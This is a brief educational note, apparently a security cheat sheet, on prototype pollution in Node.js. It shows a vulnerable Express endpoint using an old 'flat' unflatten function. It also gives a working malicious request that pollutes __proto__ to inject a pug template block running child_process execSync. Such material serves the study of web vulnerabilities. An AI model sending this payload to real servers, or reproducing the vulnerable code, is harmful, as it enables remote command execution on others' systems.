# Basic
- **Prototype pollution** is a vulnerability found in JavaScript applications which allows attackers to effectively add accessible properties to all objects, which can often lead to remote code execution or a denial-of-service.
  ```javascript
  > obj = { a: 1 }
  { a: 1 }
  > obj.b
  undefined
  > {}.__proto__.b = 2
  2
  > obj.b
  2
  ```
- The `/api/submit` endpoint uses the `unflatten` function to convert the JSON in the request body to the `artist` object, then accesses the `name` property of this object. The `unflatten` function is imported from an old version of the `flat` library, which is vulnerable to prototype pollution.
  ```javascript
  const path          = require('path');
  const express       = require('express');
  const pug           = require('pug');
  const { unflatten } = require('flat');
  const router        = express.Router();

  router.get('/', (req, res) => {
      return res.sendFile(path.resolve('views/index.html'));
  });

  router.post('/api/submit', (req, res) => {
      const { artist } = unflatten(req.body);

      if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
          return res.json({
              'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
          });
      } else {
          return res.json({
              'response': 'Please provide us with the full name of an existing member.'
          });
      }
  });
  
  module.exports = router; 
  ``` 

# Detection
### Vulnerable `pug` library
- Normal request
  ```bash
  POST /api/submit HTTP/1.1
  (Request Body)
  {
    "artist.name":"Alex Westaway",
  }
  ```
- Maliciuos request
  ```bash
  POST /api/submit HTTP/1.1
  (Request Body)
  {
    "artist.name":"Alex Westaway",
    "__proto__.block": {
          "type": "Text", 
          "line": "process.mainModule.require('child_process').execSync(`$(ls)`)"
      }
  }
  ```

# Resource
- https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
- https://www.intruder.io/research/server-side-prototype-pollution
